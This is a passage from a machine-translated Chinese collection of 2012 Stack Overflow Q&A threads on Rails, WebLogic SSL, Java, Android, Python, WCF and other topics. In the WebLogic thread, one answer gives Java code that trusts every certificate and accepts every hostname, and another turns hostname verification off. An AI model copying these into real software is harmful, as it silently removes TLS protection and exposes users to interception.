但是，阅读ffmpeg-cli的源代码是非常困难的，因为它不是用来作为理解如何使用libav的学习材料，而是作为一个优化的多媒体工具。因此，我尝试将其源代码整理为简单的伪代码函数，突出显示**何时何**地调用重要（几乎所有）libav 的函数，以获得更广泛的 ffmpeg 工作流程图景。有关**如何**调用 libav 函数调用的信息，可以参考 doxygen 文档和 ffmpeg-cli-source 文件。

# autocomplete - rails3.2 有什么好的自动完成 gem 吗？

> ID：11396255
> 
> 赞同：0
> 
> 时间：2012-07-09T13:41:49.237
> 
> 标签：autocomplete, tags, ruby-on-rails-3.2

rails3.2 有什么好的自动完成 gem 吗？如果可能，支持多个标签的那个会使用 x 按钮自动完成。谢谢：）

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-07-09T14:21:01.360

[https://github.com/crowdint/rails3-jquery-autocomplete](https://github.com/crowdint/rails3-jquery-autocomplete)我使用的这个，在rails 3.2中运行良好，或者你可以去[http://railscasts.com/episodes?utf8=%E2%9C%93&search=autocomplete](http://railscasts.com/episodes?utf8=%E2%9C%93&search=autocomplete)如果你有 RailsCasts 的高级帐户。

# windows-server-2008 - 有没有WM9Codecs。适用于 Windows Server 2008？

> ID：11396258
> 
> 赞同：2
> 
> 时间：2012-07-09T13:42:00.290
> 
> 标签：windows-server-2008, codec, windows-media-player

我尝试下载以下内容：http: [//www.microsoft.com/en-us/download/details.aspx?id=507](http://www.microsoft.com/en-us/download/details.aspx?id=507)
但我收到一条错误消息：

![错误信息](../Images/ce8e63ee8ee29f7f02b6f72c6584b1df.png)

Server 2008 有这个版本吗？我搜索了很多，但我找不到任何东西..

谢谢！

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-07-17T06:59:03.703

我发现[Media Player Codec Pack](http://download.cnet.com/Media-Player-Codec-Pack/3000-13632_4-10749065.html)包括所有 WM9Codecs 并在 Windows Server 2008 上运行。
这个包可以完成工作！

# ssl - 具有 2 路 SSL 的 Weblogic(10.3) 中的 Web 服务客户端 (JAX-WS) 无法完成握手

> ID：11396259
> 
> 赞同：1
> 
> 时间：2012-07-09T13:42:04.820
> 
> 标签：ssl, weblogic, jax-ws, cxf, handshake

一周以来，我们一直在寻找解决问题的方法，在查看了很多类似的帖子并阅读了所有可用文档之后，我们还没有找到解决方案。

我将解释我目前的情况，希望有人可以帮助我们解决问题。

我们在 JAX-WS 中开发了一个 Web 服务客户端，它与另一个平台中的服务器端 Web 服务通信。通信是 2 路 SSL，我们有服务器端的 CA，信任他，我们的私有证书在服务器端识别。

我们的 Web 服务客户端部署在 Weblogic 10.3 中，当它要调用服务器端 Web 服务时，我们动态加载信任库和仅加载一个证书的密钥库，因为每次我们要使用不同的证书，因此我们不能只使用静态密钥库。

问题是当我们建立连接、协商握手时，因为 Weblogic 忽略了我们在调用之前加载的信任库和密钥库，而只在 Weblogic 的密钥库中查找受信任的证书和私钥......

如果我们把我们信任的证书放在 Weblogic 的信任库中并重新开始通信。我们开始握手，我们信任服务器端（因为现在 Weblogic 在其密钥库中找到 CA），但是当我们的 Web 服务客户端必须发送证书以被服务器端信任时，“证书链”是空的并且我们得到一个“BAD_CERTIFICATE”。

我们已经尝试使用 Apache CXF 和 JAX-WS，但问题是一样的，使用系统属性和库设置密钥库......所以我们不知道为什么我们的 Web 服务客户端无法发送证书。由于某种原因，Weblogic 似乎没有为他们服务，也许是 Weblogic 配置，但我们不知道。

如果有人知道我们能做什么，请告诉我们。

提前致谢。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-07-12T09:10:29.830

您的问题是客户端和服务器端的 SSL 配置。SSL 握手问题与您的 Web 服务配置无关：Web 服务通过 HTTP，并且是`HttpsURLConnection`处理此问题的 java。

2 次 SSL 握手需要：

***客户端***

*   服务器证书应该在密钥库中，或者您可以在使用 Web 服务客户端之前按照说明设置此验证：

代码：

```
// Create a trust manager that does not validate certificate chains
TrustManager[] trustAllCerts = new TrustManager[] {new X509TrustManager() {
    public java.security.cert.X509Certificate[] getAcceptedIssuers() {
        return null;
    }

    public void checkClientTrusted(java.security.cert.X509Certificate[] certs, String authType) {
      }

    public void checkServerTrusted(java.security.cert.X509Certificate[] certs, String authType) {
      }
} };

// Install the all-trusting trust manager
try {
    SSLContext sc = SSLContext.getInstance("SSL");
    sc.init(null, trustAllCerts, new java.security.SecureRandom());
    HttpsURLConnection.setDefaultSSLSocketFactory(sc.getSocketFactory());
} catch (Exception e) {
} 
```

*   服务器证书“服务器名称”必须与您用于访问 Web 服务端点 ( `checkURLSpoofing`) 的 URL 匹配，或者在使用服务客户端之前关闭此验证设置

代码：

```
// Create all-trusting host name verifier
HostnameVerifier allHostsValid = new HostnameVerifier() {
    public boolean verify(String hostname, SSLSession session) {
       return true;
    }
};

// Install the all-trusting host verifier
HttpsURLConnection.setDefaultHostnameVerifier(allHostsValid); 
```

*   配置客户端以正确发送其证书。在使用 Web 服务客户端之前进行设置

代码：

```
System.setProperty("javax.net.ssl.keyStore", "path/to/your/key");
System.setProperty("javax.net.ssl.keyStorePassword", "your-keystore-password");
System.setProperty("javax.net.ssl.keyStoreType", "JKS");
System.setProperty("javax.net.ssl.trustStore", "path/to/your/trust/keystore");
System.setProperty("javax.net.ssl.trustStorePassword", "your-truststore-password");
System.setProperty("com.sun.net.ssl.dhKeyExchangeFix", "true"); 
```

***服务器端***

*   将客户端证书添加到服务器使用的信任库

这应该可以工作，如果您仍然遇到问题，请添加堆栈跟踪（客户端和服务器）以查看发生了什么。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-06-03T08:56:26.600

# 一步一步的指导。

请参阅[WebLogic Server 的 SSL 配置、](http://weblogic-wonders.com/weblogic/2011/05/25/ssl-configuration-for-weblogic-server/)为[客户端应用程序](http://docs.oracle.com/cd/E23943_01/web.1111/e13713/transport.htm#autoId4)配置双向 SSL和[配置双向 SSL](http://docs.oracle.com/cd/E23943_01/apirefs.1111/e13952/taskhelp/security/ConfigureTwowaySSL.html#WLACH03038)。

```
keytool -genkey -alias server-alias -keyalg RSA -keypass changeit_0 -storepass changeit_1 -keystore server_keystore.jks -validity 1825
keytool -export -alias server-alias -storepass changeit_1 -file server.cer -keystore server_keystore.jks

keytool -genkey -alias client-alias -keyalg RSA -keypass changeit_2 -storepass changeit_3 -keystore client_keystore.jks -validity 1825
keytool -export -alias client-alias -storepass changeit_3 -file client.cer -keystore client_keystore.jks
#WLHOME\server\lib\cacerts
keytool -import -v -trustcacerts -alias client-alias -file client.cer -keystore cacerts -keypass changeit_2 -storepass changeit

Server->Keystores
Keystores: Custom Identity and Custom Trust
Custom Identity Keystore: server_keystore.jks
Custom Identity Keystore Type: JKS
Custom Identity Keystore Passphrase: changeit_1
Custom Trust Keystore: <WLHOME>\server\lib\cacerts
Custom Trust Keystore Type: JKS
Custom Trust Keystore Passphrase: changeit

Server->General
SSL Listen Port Enabled: true

Server->SSL
Private Key Alias: server-alias
Private Key Passphrase: changeit_0
Hostname Verification: None
Use Server Certs: true
Two Way Client Cert Behavior: Client Certs Requested and Enforced
SSLRejection Logging Enabled: true 
```

1) 服务标头。

```
@WebService
@Policy(uri = "policy:Wssp1.2-2007-Https-ClientCertReq.xml") 
```

2) 客户端处理程序解析器。

```
package org.ru5.test;

import java.util.*;
import javax.xml.namespace.QName;
import javax.xml.ws.*;

public class MustUnderstandHeadersHandler implements HandlerResolver {
    @Override
    public List<Handler> getHandlerChain(PortInfo portInfo) {
        final List<Handler> handlerList = new ArrayList<Handler>(1);
        handlerList.add(new MustUnderstandHeadersSOAPHandler());
        return handlerList;
    }

    private class MustUnderstandHeadersSOAPHandler implements SOAPHandler<SOAPMessageContext> {
        private static final String LOCAL_PART = "Security";
        private static final String PREFIX = "wsse";
        private static final String URI =
                "http://docs.oasis-open.org/wss/2004/01/oasis-200401-wss-wssecurity-secext-1.0.xsd";

        @Override
        public Set<QName> getHeaders() {
            final QName securityHeader = new QName(URI, LOCAL_PART, PREFIX);
            final Set<QName> headers = new HashSet<QName>();
            headers.add(securityHeader);
            return headers;
        }

        @Override
        public boolean handleMessage(SOAPMessageContext context) {
            return true;
        }

        @Override
        public boolean handleFault(SOAPMessageContext context) {
            return true;
        }

        @Override
        public void close(javax.xml.ws.handler.MessageContext context) {
        }
    }
} 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-09-03T09:47:09.877

在我更改 Weblogic 中的设置之前，我遇到了 SSL 和 JAX-WS 的许多问题：使用 JSSE。根据 weblogic 的版本（10.3.x，x 正在改变一切），这可能会也可能不会。它适用于我的 10.3.3 和 10.3.5，它们都是 Weblogic 11g。可以使用控制台（在安全、高级）或命令行 -Dweblogic.security.SSL.enableJSSE=true 来完成此更改

原因是在以前的 SSL 的 Oracle 实现中（如果不使用 JSSE），根据算法和密钥大小，一些证书不被接受。此外，此实现使用不同的设置，并且不会将 JSSE 设置用于 javax.net.ssl.keyStore 等设置...

我现在正在使用这个 JSSE + -Djavax.net.debug=ssl:verbose，一切都很清楚。

# java - 如何为多种事件类型存储监听器

> ID：11396267
> 
> 赞同：1
> 
> 时间：2012-07-09T13:42:44.600
> 
> 标签：java, observer-pattern

我正在尝试使用 Java 中的多个侦听器和多种事件类型来实现观察者/侦听器模式。每个事件侦听器都可能对一种或多种事件类型感兴趣。

为每种特定事件类型存储侦听器并对其进行迭代的最有效方法是什么（可能是列表列表）？

当然，强烈推荐线程安全的解决方案。

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-07-09T13:46:57.230

您可以将[java.util.concurrent.ConcurrentHashMap](http://docs.oracle.com/javase/6/docs/api/java/util/concurrent/ConcurrentHashMap.html)用于线程安全哈希映射。

您需要的结构是：

```
ConcurrentHashMap<EventType,List<Listener>> map; 
```

这样，每个侦听器都注册到多个事件类型。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-07-09T13:44:39.030

也许您正在寻找[`EventListenerList`](http://docs.oracle.com/javase/7/docs/api/javax/swing/event/EventListenerList.html)课程？但我可能误解了你。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-07-09T13:48:59.140

看看[EventListenerList](http://docs.oracle.com/javase/6/docs/api/javax/swing/event/EventListenerList.html)。它包含任何实现[EventListener](http://docs.oracle.com/javase/6/docs/api/java/util/EventListener.html)的列表。然后您可以调用`getListeners(class)`以获取类型的侦听器`class`。

# android - 用于二维码读取的 Zxing 库，从市场下载一个 APK

> ID：11396268
> 
> 赞同：0
> 
> 时间：2012-07-09T13:42:46.953
> 
> 标签：android, qr-code, zxing

我的任务是在我们的应用程序中集成一个 QR 码阅读器。

我用过这个`Zebra Crossing (ZXing)`库，这个库的问题是，它重定向到市场下载一个APK文件来扫描二维码和条形码。

是否有任何库可以集成到应用程序中而无需从市场上下载任何类型的 apk。

对此的任何建议都会有所帮助。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-07-09T13:59:24.273

您应该为这项任务使用意图，而不是重新发明轮子。从谷歌看[这个](http://android-developers.blogspot.dk/2012/02/share-with-intents.html)例子。这就是它的工作方式。

# android - Android如何为微调器上的每个列表项添加不同的图像？

> ID：11396269
> 
> 赞同：0
> 
> 时间：2012-07-09T13:42:54.127
> 
> 标签：android

以下是一个位置选择器，我想向此微调器列表视图添加不同的图标。它适用于我正在尝试开发的应用程序。这样我也可以对其他微调器使用相同的方法

```
public class Addplace extends Activity implements OnItemSelectedListener {

    public String items;
    EditText name;
    Button add;

    @Override
    public void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.addpoint);

        // Spinner element
        Spinner spinner = (Spinner) findViewById(R.id.spinner);
        name = (EditText) findViewById(R.id.nameplace);
        add = (Button) findViewById(R.id.addplace);

        // Spinner click listener
        spinner.setOnItemSelectedListener(this);

        // Spinner Drop down elements
        List<String> categories = new ArrayList<String>();
        categories.add("Outdoor");
        categories.add("Shop");
        categories.add("Professional & Other place");
        categories.add("College & University");
        categories.add("Food");
        categories.add("Travel");
        categories.add("Residences");
        categories.add("Club");
        categories.add("Bar & Pub");
        categories.add("Services");

        // Creating adapter for spinner
        ArrayAdapter<String> dataAdapter = new ArrayAdapter<String>(this,
                android.R.layout.simple_spinner_item, categories);

        // Drop down layout style - list view with radio button
        dataAdapter
                .setDropDownViewResource(android.R.layout.simple_spinner_dropdown_item);

        // attaching data adapter to spinner
        spinner.setAdapter(dataAdapter);

        add.setOnClickListener(new View.OnClickListener() {

            public void onClick(View arg0) {
                // TODO Auto-generated method stub
                String nameplace = name.getText().toString();

                Toast.makeText(getApplicationContext(), nameplace + items,
                        Toast.LENGTH_SHORT).show();
            }
        });
    }

    public void onItemSelected(AdapterView<?> parent, View view, int position,
            long id) {
        // On selecting a spinner item
        items = parent.getItemAtPosition(position).toString();
    }

    public void onNothingSelected(AdapterView<?> arg0) {
        // TODO Auto-generated method stub

    }

} 
```

请善待帮助。

谢谢

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-07-09T13:45:21.680

您将需要扩展 ArrayAdapter，并覆盖其方法并为每一行添加所需的 xml，看看这个： http: [//www.coderzheaven.com/2011/07/18/customizing-a-spinner-in -安卓/](http://www.coderzheaven.com/2011/07/18/customizing-a-spinner-in-android/)

# python - 在 tkinter 中向事件添加信息

> ID：11396270
> 
> 赞同：0
> 
> 时间：2012-07-09T13:42:54.503
> 
> 标签：python, tkinter

我想知道如何向嵌入在按钮中的事件添加更多信息。

例如：

```
okButton = ttk.Button( content, text = 'OK' )
okButton.bind( "<Button-1>", browseFile )

def browseFile( event ):
    pass 
```

单击按钮时，我想将字符串参数“确定”传递给函数`browseFile`，我需要做什么？

谢谢

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-07-09T14:02:24.587

该`event`对象有一个`widget`成员，该成员标识引发事件的小部件。`cget`您可以使用以下方法获取该小部件的文本：

```
def browseFile(event):
    buttonText = event.widget.cget("text")
    if buttonText == "OK":
        doSomeStuff() 
```

# ios - setBackgroundResource() iphone 单点触控等效

> ID：11396276
> 
> 赞同：1
> 
> 时间：2012-07-09T13:43:05.427
> 
> 标签：ios, xamarin.ios

是否有等效的 R.drawable。单点触控？我还在寻找一种将 xml 图形资源定义设置为 UIView 或子类的背景的方法。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-07-09T14:39:16.673

你在这里是另一个世界。iOS 没有您在 Android 上使用的功能。

一般的做法是在 MonoTouch 中使用静态类：

```
public static class Resources
{
   public static readonly UIImage Background = UIImage.FromFile("Background.png");
} 
```

并在 C# 代码中需要它的任何地方使用它。如果您在 XIB 文件中设置图像，它将使用`UIImage.FromBundle()`，跨视图缓存图像。 `UIImage.FromFile()`但是，从静态类中使用它通常会更好。

在此处查看有关 UIImage 加载和 MonoTouch 的更多信息：http://docs.xamarin.com/ios/tutorials/Working_with_Images?highlight=images [（](http://docs.xamarin.com/ios/tutorials/Working_with_Images?highlight=images) 接近底部）

# android - 在我的情况下，几乎全屏显示对话框（使用 ActionBar 和覆盖）

> ID：11396277
> 
> 赞同：6
> 
> 时间：2012-07-09T13:43:23.023
> 
> 标签：android, android-layout, android-intent, android-emulator, android-widget

我正在使用[Android 支持包](http://developer.android.com/tools/extras/support-library.html)。

我创建了一个对话框：

```
Dialog dialog = new Dialog(activity, android.R.style.Theme_Translucent_NoTitleBar_Fullscreen); 
```

因为我希望全屏显示对话框，所以我将主题应用`Theme_Translucent_NoTitleBar_Fullscreen`到它并且它可以工作。

我有以下两个问题：

1.  我希望我的对话框仍然像全屏一样显示，但顶部的**ActionBar**不会被它覆盖，那么我应该使用什么主题？

2.  如何让灰色叠加层也显示对话框覆盖的视图（假设我的第一个问题已经解决）？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-12-06T18:48:32.760

1.  我找到的唯一可行的解​​决方案是实现基于片段的伪对话框。
2.  这种方法可能会导致做影子的一些困难。至少，我没有那样做。

代码示例怎么做（一）：

```
public class MyDialog extends Fragment {

@Override
public View onCreateView(LayoutInflater inflater, ViewGroup container, Bundle savedInstanceState) {
    // ... your code
}

public void show(FragmentManager fragmentManager) {
    FragmentTransaction ft = fragmentManager.beginTransaction();
    String tag = MyDialog.class.getName();
    ft.add(android.R.id.content, this, tag);
    ft.commit();
}

private void dismiss() {
    FragmentTransaction ft = getFragmentManager().beginTransaction();
    ft.remove(this);
    ft.commit();
}
} 
```

# django - 与带有 HRD 的 Google App Engine 一起使用的最可靠的 django fork 是什么？

> ID：11396278
> 
> 赞同：2
> 
> 时间：2012-07-09T13:43:26.647
> 
> 标签：django, google-app-engine, python-2.7, django-nonrel

Django nonrel 的 github 显示的最近活动很少。是否有更受支持的库？如果不是，Django-nonrel 的可靠性如何？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-07-14T22:07:24.107

我也在研究同样的。我发现几乎所有讨论 Django 的 GAE 页面（参见[此处](https://developers.google.com/appengine/articles/django)、[此处](https://developers.google.com/appengine/articles/app-engine-patch)、[此处](https://developers.google.com/appengine/articles/appengine_helper_for_django)）都很旧，但它们在顶部有注释/更新，建议（警告）如果您应该使用 django-nonrel想在 GAE 上使用 Django。

我还发现了这个[（旧）GAE 页面](https://developers.google.com/appengine/articles/djangoforms)，它解释了如何使用 google.appengine.ext.db.djangoforms 来获得 Django 表单支持（不需要 django-nonrel，尽管这也意味着您需要使用 GAE 的数据模型，而不是Django 的——但我很想尝试一下），但后来我看到GAE 在 Python 2.7中[放弃了对 db.djangoform 的支持。](https://developers.google.com/appengine/docs/python/python27/newin27#djangoforms_Support)这里死胡同。

因此，如果我们想将 Django 与 GAE 一起用于除 Django 模板之外的任何东西（我们是否在 GAE 上仅使用预安装的 Django 获得任何其他 Django 功能？？），我们必须使用 django-nonrel。我不知道 GAE 的任何其他 Django 替代品（嗯，有这个[Google Summer of Code 项目](http://www.allbuttonspressed.com/blog/django/2010/08/Final-official-GSoC-Django-NoSQL-status-update)，但我不知道那个项目发生了什么）。

就可靠性而言，这里有一些可能感兴趣的 google 群组帖子： [post1](https://groups.google.com/forum/?fromgroups#!topic/django-non-relational/6OnZoFEwdnw)、[post2](https://groups.google.com/forum/?fromgroups#!topic/django-non-relational/_OFjwuPjc88)。

有点令人担忧，例如，有人在 6 月 28 日在该组发帖询问如何在 appengine 上试用 Django 1.4，而截至今天（16 天后）还没有人回应。再说一次，它看起来像是一个欢迎任何帮助的项目。

顺便说一句，您应该能够将 Django 的数据模型与 django-nonrel 一起使用，因此不必使用 GAE 数据模型：[关于 django-nonrel 的 GAE 文章](https://developers.google.com/appengine/articles/django-nonrel#md)。但是，不支持某些模型（例如多对多），因此对于任何重要的项目都可能需要进行一些返工/重新设计/重新思考。

在这一点上，我还没有决定是走 Django + django-nonrel + djangoappengine 路线，还是 webapp2 路线。

# coldfusion - Coldfusion10 Solr cfindex数据导入与DataImportHandler不同，如何配置data-config.xml？

> ID：11396282
> 
> 赞同：1
> 
> 时间：2012-07-09T13:43:37.957
> 
> 标签：coldfusion, solr, dataimporthandler, coldfusion-10, dih

我正在尝试使用 Coldfusion10 进行 solr 搜索。我在 Solr 安装中使用了构建，并使用 CF Admin 创建了集合。它创建了一个 schema.xml，应该与 cfindex 和 cfsearch 等一起使用。

首先，我在 Coldfusion 中编写了一个导入脚本，通过查询获取数据并使用 cfindex 将其提供给 solr。

```
<cfquery name="myList" datasource="#db#" dbtype="#dbtype#">
    SELECTT TOP 20000 prodID,name,desc,accountID,shopID,ean,isbn
    FROM products
</cfquery>

<cfindex action="update" collection="testcollection" query="myList" type="custom" status="info" 
            key="prodID"   
            title="name"
            body="desc"  
            accountID_i=accountID
            shopID_i=shopID
            ean_s="ean"
            isbn_s="isbn"
            /> 
```

这很好用，但不够快。我可以完美搜索，如果我在搜索条件中拼写错误，它会给出我的建议查询结果。例如搜索“pleystation”建议g“playstation”等。

之后想尝试一下 Data Import Hanlder von Solr。我得到了一切工作，数据库连接，所有基本配置文件开始完全导入。

索引速度非常快，但没有给我任何建议等。我确定我没有正确配置 data-import.xml 文件。问题是，我不知道 Coldfusion10 如何处理我提供给 cfindex 标签并将其发送给 solr 的文件。

这是我尝试过的 data-config.xml 文件之一。

```
<dataConfig>
<dataSource driver="net.sourceforge.jtds.jdbc.Driver" type="JdbcDataSource" url="jdbc:jtds:sqlserver://192.168.1.1:1234/myDatabase;DatabaseName=myDatabase;" user="test" password="test"/>
<document name="products">
    <entity name="products" query="SELECT TOP 20000 prodID,name,desc,accountID,shopID,ean,isbn FROM products">
        <field column="prodID" name="uid"/>
        <field column="prodID" name="key"/>
        <field column="name" name="title"/>
        <field column="desc" name="body"/>
        <field column="accountID" name="accountid_i"/>
        <field column="shopID" name="shopid_i"/>
        <field column="ean" name="ean_s"/>
        <field column="isbn" name="isbn_s"/>
    </entity>
</document></dataConfig> 
```

看起来使用 DIH Solr 处理内容的方式与使用 cfindex 时处理的方式不同。我尝试使用 cf 创建的 schema.xml 中的不同字段名称，例如比赛等，但这没有帮助。

对这个问题的任何帮助或建议都会很棒:)

问候马库斯

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-09-16T06:19:14.167

使用 DIH 对其进行索引时存在一些差异。像键一样，自定义字段和类别不可用。DIH 主要限于索引数据库，只需要 3 个属性*collection,type,action*。如果您使用 DIH，则无需向 cfindex 提供文件。您只需要将 data-config.xml 放到集合的文件夹中。

其他然后建议您如何观察到 DIH Solr 是否有任何其他不一致？

谢谢库纳尔

# asp.net - 在 asp.net vb 中发布 xml 数据并检索 xml 响应

> ID：11396286
> 
> 赞同：1
> 
> 时间：2012-07-09T13:44:06.953
> 
> 标签：asp.net, xml, vb.net

什么是最佳实践或如何从以下获得 xml 响应。

文件说

> 为了从系统中检索请求的数据，必须通过 HTTP-Post 在调用“加载”的参数中将 XML 消息发送到以下 URL

简单请求示例：

```
<Request version="1.0">
<Header>
    <Security sender="ff80808109c5bcc00109c5bce9f1003a"/>
</Header>
<Query entity="ff80808109c5bcc00109c5bce9f50056" level="CHANNEL" mode="INTEGRATOR_TEST" type="STANDARD">
    <User login="ff80808109c5bcc00109c5bce9f20042" pwd="geheim"/>
    <Period from="2006-03-04" to="2006-03-04"/>
    <Types>
        <Type code="RF"/>
        <Type code="PA"/>
        <Type code="RV"/>
    </Types>
</Query> 
```

这是如何在 ASP.NET（2.0 - 3.5 更好？）中使用 vb 完成的？如何进一步处理生成的响应 xml？也许将其输出为文字。

非常感谢您的反馈...问候

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-07-09T13:55:32.090

您可以使用 LINQ 来处理您的 xml 响应：

```
XDocument doc = XDocument.Parse(response);
Dim userDetails = From item In doc.Elements("Query").Elements("User")
Select item; 
```

# php - 我应该在构造函数中还是在与数据库一起使用的每个方法中连接到数据库一次？

> ID：11396287
> 
> 赞同：-2
> 
> 时间：2012-07-09T13:44:11.163
> 
> 标签：php, mysql-connect

我有一个包含三个方法的类：

*   插入
*   更新
*   删除

这些方法中的每一个都适用于数据库。哪种方法更好？

1.  在构造函数中连接数据库，在析构函数中关闭连接，或者
2.  分别在每种方法中打开和关闭连接？

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-07-09T13:47:25.113

在调用方法之前，您只需连接一次您想要做的事情。

您必须在方法之前进行连接，然后在每个方法中执行您的 mysql 查询。

如果您觉得需要，您可以在调用方法后断开连接，但通常不需要关闭连接，因为它会在页面加载后自动关闭。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-07-09T13:48:34.757

这取决于用例。但在 99% 的情况下，您会在构造函数中打开连接。（不要介意析构函数。如果它不是持久连接，PHP 会在脚本端销毁连接。）

# html - 具有相同高度的文本字段旁边的提交按钮

> ID：11396290
> 
> 赞同：3
> 
> 时间：2012-07-09T13:44:21.980
> 
> 标签：html, css

我正在尝试使用文本字段旁边的提交按钮实现完美对齐，每个按钮都有自己的字体大小。问题是我在不同的浏览器中得到不同的结果（我的网站支持 IE7+ 和所有现代浏览器）。

这是我正在做的事情：http: [//jsfiddle.net/bxTfn/18/](http://jsfiddle.net/bxTfn/18/)

它似乎在 Chrome 和 IE 中工作，但提交按钮在 FF 中太短了 1px。

谢谢你的帮助。

澄清：我希望文本框的字体大小为 14 像素，提交为 12 像素。

**更新： http:** [//jsfiddle.net/bxTfn/24/](http://jsfiddle.net/bxTfn/24/) 这似乎在 Chrome、FF 和 IE7 中有效，但在提交跳下 1px 的 IE8 和 IE9 中无效。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-07-09T13:47:23.970

在您的小提琴中，您的以下更改`CSS`似乎完美地排列了它们：

```
input[type=text] {
    height: 18px;
    font-size: 14px;    
}

input[type=submit] {
    font-size: 14px;
    height: 20px;
}​ 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-07-09T21:37:03.340

box-sizing 可能是您正在寻找的：http: [//jsfiddle.net/23CE8/1/](http://jsfiddle.net/23CE8/1/)

这在 Chrome 和 IE8 中对我有用，但是 IE8 现在错误对齐输入和提交按钮（尽管它们的高度相同）。为了解决这个问题，我在两个元素中添加了 vertical-align: middle （尽管它可能在它们的父容器上）。

如果你想让 IE7 使用 box-sizing，你需要一些 polyfill，这里有一个来自 Paul Irish 的博客的链接：http: [//paulirish.com/2012/box-sizing-border-box-ftw/](http://paulirish.com/2012/box-sizing-border-box-ftw/)他也解释了一些优点和缺点。

# wcf - 在客户端记录 WCF 错误

> ID：11396297
> 
> 赞同：2
> 
> 时间：2012-07-09T13:44:53.273
> 
> 标签：wcf, wcf-client, wcf-faults

我的应用程序使用 WCF 调用 Web 服务。调用可能因各种原因而失败：

*   过错
*   暂停
*   连接丢失
*   ...

我想记录所有此类错误。我不想将每个调用都包装在 try-catch 中，而是想在一个地方为整个应用程序中的所有 Web 服务调用执行此操作。

不幸的是，IClientMessageInspector 不会因超时和连接失败而被调用。**是否有可用于集中记录所有异常的 WCF 扩展点？**

请注意，我不只是想将错误记录为 WCF Tracing 之类的文本。我想记录：

*   服务名称
*   方法名
*   期间
*   异常.ToString()

我愿意接受解决方法。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-07-10T16:02:18.183

我不知道扩展点，但我可以提供我们使用的解决方法。基本上，我们创建了一个所有服务调用都通过的“代理”。下面是代理及其使用示例。

```
/// <summary>
/// Proxy for executing generic service methods
/// </summary>
public class ServiceProxy
{
    /// <summary>
    /// Execute service method and get return value
    /// </summary>
    /// <typeparam name="C">Type of service</typeparam>
    /// <typeparam name="T">Type of return value</typeparam>
    /// <param name="action">Delegate for implementing the service method</param>
    /// <returns>Object of type T</returns>
    public static T Execute<C, T>(Func<C, T> action) where C : class, ICommunicationObject, new()
    {
        C svc = null;

        T result = default(T);

        try
        {
            svc = new C();

            result = action.Invoke(svc);

            svc.Close();
        }
        catch (FaultException ex)
        {
            // Logging goes here
            // Service Name: svc.GetType().Name
            // Method Name: action.Method.Name
            // Duration: You could note the time before/after the service call and calculate the difference
            // Exception: ex.Reason.ToString()

            if (svc != null)
            {
                svc.Abort();
            }

            throw;
        }
        catch (Exception ex)
        {
            // Logging goes here

            if (svc != null)
            {
                svc.Abort();
            }

            throw;
        }

        return result;
    }
} 
```

及其使用示例：

```
var result = ServiceProxy.Execute<MyServiceClient, MyReturnType>
(
    svc => svc.GetSomething(someId)
); 
```

# r - 为什么 direct.lable 中包含的第一个示例会出错？

> ID：11396302
> 
> 赞同：2
> 
> 时间：2012-07-09T13:45:18.290
> 
> 标签：r, ggplot2

我只是运行在与“direct.label”函数相关的文档中找到的代码。这是第一个例子：

```
library(ggplot2)
## direct label simple ggplot2 scatterplot
scatter <- qplot(jitter(hwy),jitter(cty),data=mpg,colour=class,
                 main="Fuel efficiency depends on car size")
print(direct.label(scatter)) 
```

结果我得到以下

> 原型中的错误（Geom，{：找不到对象'Geom'

任何想法？？？

PS我已经阅读了以下内容，但它们无济于事…… [为包创建新几何时出现“找不到对象”错误](https://stackoverflow.com/questions/5058347/object-not-found-error-when-creating-a-new-geom-for-a-package)； [geom_rect 失败：eval 中的错误（expr，envir，enclos）：找不到对象“变量”](https://stackoverflow.com/questions/10154293/geom-rect-failure-error-in-evalexpr-envir-enclos-object-variable-not-fo)； [ggplot2 找不到对象错误](https://stackoverflow.com/questions/5514345/object-not-found-error-with-ggplot2)； [insertSource() 出错：“找不到对象 '.cacheOnAssign'”](https://stackoverflow.com/questions/5981005/error-with-insertsource-object-cacheonassign-not-found)； [致命错误：找不到对象 scala](https://stackoverflow.com/questions/5395470/fatal-error-object-scala-not-found)。

# html - 内存缓存还是本地存储？哪个更好用？

> ID：11396303
> 
> 赞同：-1
> 
> 时间：2012-07-09T13:45:20.943
> 
> 标签：html, memcached, local-storage

有什么区别，优点和缺点......哪个更好用？

由于我是从头开始开发的，所以可以放一些光来创建更好的应用程序。

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-07-09T13:47:08.047

如果您需要客户端上的数据，LocalStorage 会更好。

如果您需要服务器上的数据，memcached 会更好。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2017-05-12T06:53:45.513

我完全同意@Rik，但在我的一个 AngulaJs 应用程序中，我使用了本地存储而不是 memcached。

当用户第一次获取记录时它会更慢，但从第二次开始它将从本地存储而不是从服务器获取。

# facebook-graph-api - 是否可以通过 facebook graph API 发起好友请求？

> ID：11396308
> 
> 赞同：-2
> 
> 时间：2012-07-09T13:45:40.247
> 
> 标签：facebook-graph-api

我想通过 facebook graph API 发起好友请求，可以吗？

* * *

## 回答 #1

> 赞同：-1
> 
> 时间：2012-07-09T13:56:15.010

在 Google 中输入“Facebook Graph API”，你会发现这个链接：

[https://developers.facebook.com/docs/reference/api/event/](https://developers.facebook.com/docs/reference/api/event/)

有这个描述：

**创造**

